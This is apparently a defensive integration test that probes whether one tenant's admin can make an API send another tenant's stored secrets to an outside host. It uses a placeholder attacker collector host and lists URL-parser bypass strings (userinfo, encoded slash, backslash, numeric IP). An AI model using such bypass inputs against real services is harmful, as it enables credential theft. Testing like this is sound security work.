// code-security-reviewer DG6 round 3 probe (adversarial re-verification of F-DG6-181). NOT part of the candidate;
// copied into a disposable clone's tests/qa/integration by checks.sh and removed afterwards. Every value, name, code and
// host is SYNTHETIC. The manifest is the one IT would write (names, scopes and hosts, never a value).
//
// Beyond the implementer's SB-1..SB-8 (apps/api/test/integration/integrations/secret-binding.test.ts), this tries:
//   R1  the round-2 reproduction, with IT's binding for organization B in place;
//   R2  A names B's secret pointed at B's OWN bound host (only the organization stands in the way), and the refusal is
//       byte-identical to an unbound, unset name (no oracle);
//   R3  B's own admin tries URL-parser tricks on its own bound secret (userinfo, suffix, trailing dot, upper case,
//       another port, a percent-encoded host, an IPv4 form); whatever is accepted, the bearer is only ever sent to a URL
//       whose WHATWG hostname is exactly the bound host;
//   R4  webhook ROTATE (not create) of an org-A endpoint to B's signing secret;
//   R5  the storage candidate TEST (not PUT) naming B's connector secret at the bound S3 host;
//   R6  organization-code squatting: IT pre-binds a secret to an organization code that does not exist yet (rule A9
//       allows it); A's ADM_TECH creates that organization. Logged as an observation; asserted only that the secret is
//       never sent to a host IT did not list.
// Expectations state the CORRECT behaviour; only the http_pull network transport is a recorder.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createHttpPullAdapter } from "../../../apps/api/src/modules/integrations/adapters/http-pull.ts";
import {
  createConnectorAdapterRegistry,
  setConnectorAdapters,
  type ConnectorAdapterRegistry,
} from "../../../apps/api/src/modules/integrations/adapters/port.ts";
import {
  call,
  createTransformationRow,
  createUser,
  grant,
  seedWorld,
  signIn,
  startApi,
  uniq,
  type Session,
  type TestApi,
  type World,
} from "../../../apps/api/test/support/harness.ts";
import { bindSecrets } from "../../../apps/api/test/support/secret-bindings.ts";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Body = any;
const L = "/api/v1/admin/connectors";
const ORGB_NAME = "MTH_SECRET_CS_R2_ORGB_ERP_TOKEN";
const ORGB_TOKEN = "synthetic-orgb-erp-token-cs-r2-e3f1";
const ORGA_SIGNING = "MTH_SECRET_CS_R3_ORGA_SIGNING";
const ORGB_SIGNING = "MTH_SECRET_CS_R3_ORGB_SIGNING";
const S3_KEY = "MTH_SECRET_CS_R3_S3_KEY";
const PRE_NAME = "MTH_SECRET_CS_R3_PREBOUND_TOKEN";
const PRE_TOKEN = "synthetic-prebound-token-cs-r3-41aa";
const NOBODY = "MTH_SECRET_CS_R3_NOBODY";
const ORGB_HOST = "erp.orgb.example.invalid";
const PRE_HOST = "erp.pre.example.invalid";
const PRE_CODE = `CSR3PRE${Math.random().toString(16).slice(2, 8).toUpperCase()}`;

const captured: { url: string; authorization: string | null }[] = [];
let api: TestApi;
let w: World;
let adminA: Session;
let adminB: Session;
let previous: ConnectorAdapterRegistry;
let unbind: () => void = () => undefined;

beforeAll(async () => {
  process.env[ORGB_NAME] = ORGB_TOKEN;
  process.env[ORGA_SIGNING] = "whsec-synthetic-orga-cs-r3";
  process.env[ORGB_SIGNING] = "whsec-synthetic-orgb-cs-r3";
  process.env[S3_KEY] = "synthetic-s3-key-cs-r3";
  process.env[PRE_NAME] = PRE_TOKEN;
  delete process.env[NOBODY];
  api = await startApi();
  previous = setConnectorAdapters(
    createConnectorAdapterRegistry([
      createHttpPullAdapter({
        transport: async (url, init) => {
          const h = (init.headers ?? {}) as Record<string, string>;
          captured.push({ url, authorization: h["authorization"] ?? null });
          return new Response(JSON.stringify({ rows: [], rowCount: 0, controlTotal: null }), { status: 200 });
        },
      }),
    ]),
  );
  w = await seedWorld(api.db);
  adminA = await signIn(api.app, w.admin.subject); // ADM_TECH + ADM_ACCESS @ orgA only
  const b = await createUser(api.db, w.orgB.id);
  await grant(api.db, w.grantor.id, b.id, "ADM_TECH", { type: "organization", id: w.orgB.id }, w.orgB.id);
  adminB = await signIn(api.app, b.subject);
  unbind = bindSecrets([
    { name: ORGB_NAME, consumer: "connector", organization: w.orgB.code, hosts: [ORGB_HOST] },
    { name: ORGA_SIGNING, consumer: "webhook_signing", organization: w.orgA.code },
    { name: ORGB_SIGNING, consumer: "webhook_signing", organization: w.orgB.code },
    { name: S3_KEY, consumer: "storage", organization: null, hosts: ["objects.it.example.invalid"] },
    // IT binds a secret for an organization that is about to be created (rule A9: binds nothing until it exists).
    { name: PRE_NAME, consumer: "connector", organization: PRE_CODE, hosts: [PRE_HOST] },
  ]);
}, 240_000);

afterAll(async () => {
  unbind();
  setConnectorAdapters(previous);
  for (const n of [ORGB_NAME, ORGA_SIGNING, ORGB_SIGNING, S3_KEY, PRE_NAME]) delete process.env[n];
  await api?.close();
});

function body(orgId: string, endpointUrl: string | null, name: string | null, adapterKind = "http_pull") {
  return {
    organizationId: orgId,
    code: uniq("xorg-").toLowerCase(),
    nameEn: "Synthetic source",
    nameAr: "مصدر اصطناعي",
    adapterKind,
    targetKind: "none",
    config: {
      sourceSystemId: "synthetic.source:v1",
      endpointUrl,
      credentialRefs: name === null ? {} : { bearer: { provider: "env", name } },
      fieldMappings: [],
      targetTransformationId: null,
      cadence: "manual",
      retryMaxAttempts: 0,
      retryBackoffSeconds: 60,
      commitMode: "manual",
      commitOnBehalfOf: null,
      outboundActions: [],
      reconciliationRule: "none",
      adapterSettings: {},
      reason: "Synthetic SecretRef binding probe (cs-r3).",
    },
  };
}

/** Every captured call that carried a given token, with the WHATWG hostname it went to. */
const sentWith = (token: string) =>
  captured.filter((c) => (c.authorization ?? "").includes(token)).map((c) => new URL(c.url).hostname);
const shape = (r: { status: number; body: Body }) =>
  JSON.stringify({ status: r.status, type: r.body?.type, code: r.body?.code, errors: r.body?.errors });

describe("cs-r3: F-DG6-181 adversarial re-verification", () => {
  it("R1 (round-2 reproduction, IT's binding for B in place): A cannot send B's secret to A's host", async () => {
    const own = await call<Body>(api.app, "POST", L, {
      session: adminB,
      body: body(w.orgB.id, `https://${ORGB_HOST}/api`, ORGB_NAME),
    });
    console.log("R1 B's own connector", own.status, JSON.stringify(own.body?.config?.credentialRefs ?? own.body));
    expect(own.status).toBe(201);
    const peek = await call<Body>(api.app, "GET", `${L}/${own.body.id}`, { session: adminA, contract: false });
    console.log("R1 A GET B's connector", peek.status);
    expect(peek.status).toBe(404);
    const a = await call<Body>(api.app, "POST", L, {
      session: adminA,
      body: body(w.orgA.id, "https://collector.attacker.example.invalid/x", ORGB_NAME),
      contract: false,
    });
    console.log("R1 A's connector naming B's secret", a.status, JSON.stringify(a.body).slice(0, 400));
    expect(a.status).toBe(400);
    const t = await call<Body>(api.app, "POST", `${L}/${own.body.id}/test`, { session: adminB, body: {} });
    console.log("R1 B's own test", t.status, t.body?.status, t.body?.errorCode ?? null);
    console.log("R1 hosts that received B's token", JSON.stringify(sentWith(ORGB_TOKEN)));
    expect(sentWith(ORGB_TOKEN).every((h) => h === ORGB_HOST)).toBe(true);
    expect(sentWith(ORGB_TOKEN).length).toBeGreaterThan(0);
  }, 180_000);

  it("R2: A naming B's secret at B's OWN bound host is refused exactly like an unset unbound name", async () => {
    const a = await call<Body>(api.app, "POST", L, {
      session: adminA,
      body: body(w.orgA.id, `https://${ORGB_HOST}/a-side`, ORGB_NAME),
      contract: false,
    });
    const nobody = await call<Body>(api.app, "POST", L, {
      session: adminA,
      body: body(w.orgA.id, `https://${ORGB_HOST}/a-side`, NOBODY),
      contract: false,
    });
    console.log("R2 B's name at B's host", shape(a));
    console.log("R2 unset unbound name   ", shape(nobody));
    expect(a.status).toBe(400);
    expect(shape(a)).toBe(shape(nobody));
    expect(captured.some((c) => c.url.includes("/a-side"))).toBe(false);
  }, 120_000);

  it("R3: URL-parser tricks on B's own bound secret never send it to another hostname", async () => {
    const tricks = [
      `https://${ORGB_HOST}@collector.attacker.example.invalid/x`,
      `https://${ORGB_HOST}.collector.attacker.example.invalid/x`,
      `https://collector.attacker.example.invalid/${ORGB_HOST}`,
      `https://${ORGB_HOST}./x`,
      `https://${ORGB_HOST.toUpperCase()}/x`,
      `https://${ORGB_HOST}:8443/x`,
      `https://erp.orgb.example.invalid%2F@collector.attacker.example.invalid/x`,
      `https://${ORGB_HOST}\\@collector.attacker.example.invalid/x`,
      "https://2130706433/x",
    ];
    for (const url of tricks) {
      const r = await call<Body>(api.app, "POST", L, {
        session: adminB,
        body: body(w.orgB.id, url, ORGB_NAME),
        contract: false,
      });
      let test = "";
      if (r.status === 201) {
        const t = await call<Body>(api.app, "POST", `${L}/${r.body.id}/test`, { session: adminB, body: {} });
        test = `test ${t.status} ${t.body?.status} ${t.body?.errorCode ?? ""}`;
      }
      console.log("R3", JSON.stringify(url), "->", r.status, r.body?.errors?.[0]?.code ?? r.body?.code ?? "", test);
    }
    console.log("R3 hosts that received B's token", JSON.stringify([...new Set(sentWith(ORGB_TOKEN))]));
    expect(sentWith(ORGB_TOKEN).every((h) => h === ORGB_HOST)).toBe(true);
  }, 240_000);

  it("R4: rotating an org-A webhook endpoint to B's signing secret is refused", async () => {
    const tx = await createTransformationRow(api.db, w.orgA.id, w.a1, w.admin.id);
    const hb = body(w.orgA.id, null, null, "webhook");
    const hook = await call<Body>(api.app, "POST", L, {
      session: adminA,
      body: { ...hb, targetKind: "kpi_actual", config: { ...hb.config, targetTransformationId: tx } },
    });
    expect(hook.status, JSON.stringify(hook.body)).toBe(201);
    const ep = await call<Body>(api.app, "POST", "/api/v1/admin/webhooks", {
      session: adminA,
      body: {
        connectorId: hook.body.id,
        label: "Synthetic sender",
        signingSecretRef: { provider: "env", name: ORGA_SIGNING },
        toleranceSeconds: 300,
      },
    });
    console.log("R4 A endpoint with A's bound secret", ep.status);
    expect(ep.status, JSON.stringify(ep.body)).toBe(201);
    const rot = await call<Body>(api.app, "POST", `/api/v1/admin/webhooks/${ep.body.id}/rotate-secret`, {
      session: adminA,
      headers: { "if-match": `"${ep.body.version}"` },
      body: { signingSecretRef: { provider: "env", name: ORGB_SIGNING }, graceHours: 1, reason: "Synthetic rotate." },
      contract: false,
    });
    console.log("R4 rotate to B's signing secret", shape(rot));
    expect(rot.status).toBe(400);
    expect(rot.body.errors).toEqual([
      expect.objectContaining({ pointer: "/signingSecretRef", code: "validation.secret_ref_not_bound" }),
    ]);
    const after = await api.db
      .selectFrom("webhook_endpoint")
      .select(["signing_secret_ref", "version"])
      .where("id", "=", ep.body.id)
      .executeTakeFirstOrThrow();
    console.log("R4 stored after refusal", JSON.stringify(after));
    expect(JSON.stringify(after.signing_secret_ref)).toContain(ORGA_SIGNING);
  }, 120_000);

  it("R5: the storage candidate TEST naming B's connector secret at the bound S3 host is refused", async () => {
    const t = await call<Body>(api.app, "POST", "/api/v1/admin/storage/test", {
      session: adminA,
      body: {
        candidate: {
          endpoint: "https://objects.it.example.invalid",
          region: "synthetic-1",
          bucket: "synthetic-bucket",
          keyPrefix: null,
          forcePathStyle: true,
          accessKeyRef: { provider: "env", name: S3_KEY },
          secretKeyRef: { provider: "env", name: ORGB_NAME },
        },
      },
      contract: false,
    });
    console.log("R5 storage candidate test", shape(t));
    expect(t.status).toBe(400);
    expect(t.body.errors).toEqual([
      expect.objectContaining({ pointer: "/candidate/secretKeyRef", code: "validation.secret_ref_not_bound" }),
    ]);
  }, 120_000);

  it("R6 (observation): an organization code IT pre-bound can be created by another organization's ADM_TECH", async () => {
    const org = await call<Body>(api.app, "POST", "/api/v1/organizations", {
      session: adminA,
      body: { code: PRE_CODE, nameEn: "Synthetic pre-bound org", nameAr: "مؤسسة اصطناعية" },
      contract: false,
    });
    console.log("R6 A's ADM_TECH creates organization", PRE_CODE, "->", org.status);
    if (org.status !== 201) return;
    // The creator receives admin roles in the new organization (grantCreatorAdminRoles); a fresh session sees them.
    const fresh = await signIn(api.app, w.admin.subject);
    const own = await call<Body>(api.app, "POST", L, {
      session: fresh,
      body: body(org.body.id, `https://${PRE_HOST}/pull`, PRE_NAME),
      contract: false,
    });
    console.log("R6 connector in the new organization naming the pre-bound secret at its bound host ->", own.status);
    const away = await call<Body>(api.app, "POST", L, {
      session: fresh,
      body: body(org.body.id, "https://collector.attacker.example.invalid/x", PRE_NAME),
      contract: false,
    });
    console.log("R6 the same at another host ->", shape(away));
    if (own.status === 201) {
      const t = await call<Body>(api.app, "POST", `${L}/${own.body.id}/test`, { session: fresh, body: {} });
      console.log("R6 test", t.status, t.body?.status, t.body?.errorCode ?? null);
    }
    console.log("R6 hosts that received the pre-bound token", JSON.stringify([...new Set(sentWith(PRE_TOKEN))]));
    expect(away.status).toBe(400);
    expect(sentWith(PRE_TOKEN).every((h) => h === PRE_HOST)).toBe(true);
  }, 180_000);
});
